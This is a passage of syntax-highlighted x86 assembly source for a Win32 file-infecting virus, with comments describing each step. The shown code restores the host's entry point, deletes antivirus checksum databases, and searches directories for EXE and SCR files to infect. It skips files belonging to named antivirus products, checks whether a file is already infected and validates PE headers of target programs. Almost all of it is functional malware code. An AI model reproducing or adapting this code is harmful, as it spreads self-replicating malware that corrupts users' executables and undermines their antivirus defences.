                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetCurProc</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Restore host entry-point code</span><span class="sc0">
                </span><span class="sc1">;Use WriteProcessMemory in order to prevent exceptions</span><span class="sc0">
                </span><span class="sc1">;while writing to protected areas</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">insert_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_code</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_WriteProcMem</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">back2host</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;Back to host</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Infect *.EXE and *.SCR files in specified path</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">do_in_dir</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;The virus will not infect files in the root directory</span><span class="sc0">
                </span><span class="sc1">;directory</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;eax - path string size</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;None</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Trying to infect files in root directory?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">file_not_found</span><span class="sc0">

                </span><span class="sc1">;Delete some AV checksum databases</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">end_AV_files</span><span class="sc4">-</span><span class="sc5">tbl_AV_files</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_AV_files</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_del_AV</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delete_file</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_del_AV</span><span class="sc0">

                </span><span class="sc1">;Insert *.* into path</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szSearch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_szMask</span><span class="sc0">

                </span><span class="sc1">;FindFirstFile</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FindFirst</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_not_found</span><span class="sc0">

                </span><span class="sc1">;Save the search handle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Search_h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                
</span><span class="sc5">try_this_file</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Check file size</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc4">-(</span><span class="sc5">inf_size</span><span class="sc4">+</span><span class="sc5">SIZE_PADDING</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">

                </span><span class="sc1">;Check if file is already infected</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_PADDING</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">

                </span><span class="sc1">;Add filename to path                </span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">do_path_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">avoid_path</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">avoid_path</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">do_path_1</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">do_path_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"a"</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">char_is_ok</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc3">"a"</span><span class="sc4">-</span><span class="sc3">"A"</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">char_is_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"V"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">do_path_2</span><span class="sc0">

                </span><span class="sc1">;The virus does not infect files with V character in their</span><span class="sc0">
                </span><span class="sc1">;names as well as the following programs:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Panda antivirus</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"DNAP"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">

                </span><span class="sc1">;Datafellows F-Prot</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"RP-F"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">

                </span><span class="sc1">;McAfee Scan</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"NACS"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">

                </span><span class="sc1">;Check file extension, allow *.EXE and *.SRC files</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000005h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"EXE."</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">target_file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"RCS."</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">

</span><span class="sc5">target_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Open and map file</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_map_file</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">

                </span><span class="sc1">;Check if we can infect this file</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_victim</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">bad_host</span><span class="sc0">

</span><span class="sc5">atach_2host</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Infect file</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">search_end</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">cant_open</span><span class="sc0">

</span><span class="sc5">bad_host</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;File cant be infected, skip it</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unmap_close</span><span class="sc0">

</span><span class="sc5">cant_open</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;Find next file</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Search_h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FindNext</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">try_this_file</span><span class="sc0">

</span><span class="sc5">search_end</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Close Win32 find handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Search_h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_FindClose</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">file_not_found</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Copy search mask into work path</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">copy_szMask</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;edx - Filename offset in path string</span><span class="sc0">
                </span><span class="sc1">;esi - Search mask</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;None</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">                </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">loop_copy_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">loop_copy_name</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Delete file in work path</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">delete_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;edx - Filename offset in path string</span><span class="sc0">
                </span><span class="sc1">;esi - File to delete</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;None</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Add filename to path</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_szMask</span><span class="sc0">

                </span><span class="sc1">;Reset attributes so we can delete write protected files</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_SetFileAttr</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Delete file</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">szWorkDir</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_DeleteFile</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Check if a given file can be infected</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">check_victim</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;The host must be PE, fit allowed size and import at least</span><span class="sc0">
                </span><span class="sc1">;one function from Kernel32</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;a_Kernel32 - Base address for kernel32</span><span class="sc0">
                </span><span class="sc1">;eax        - Base address for memory mapped file</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ecx - Null if error</span><span class="sc0">
                </span><span class="sc1">;eax - Preserved</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc1">;Save host base address</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Set structured exception handler</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SEH_SetFrame01</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">err_checkfile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SEH_error01</span><span class="sc0">
</span><span class="sc5">SEH_SetFrame01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

                </span><span class="sc1">;Search for Kernel32 Import Module Descriptor, abort</span><span class="sc0">
                </span><span class="sc1">;infection if not found</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;ebx - Base address of host in memory</span><span class="sc0">

                </span><span class="sc1">;Check for MZ signature at base address</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">

                </span><span class="sc1">;Check file address of relocation table</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">DH_lfarlc</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">

                </span><span class="sc1">;Now go to the pe header and check for the PE signature</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">DH_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">

                </span><span class="sc1">;Check machine field in IMAGE_FILE_HEADER</span><span class="sc0">
                </span><span class="sc1">;just allow i386 PE files</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_Machine</span><span class="sc4">],</span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_checkfile</span><span class="sc0">

                </span><span class="sc1">;Now check the characteristics, look if file</span><span class="sc0">
                </span><span class="sc1">;is an executable</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
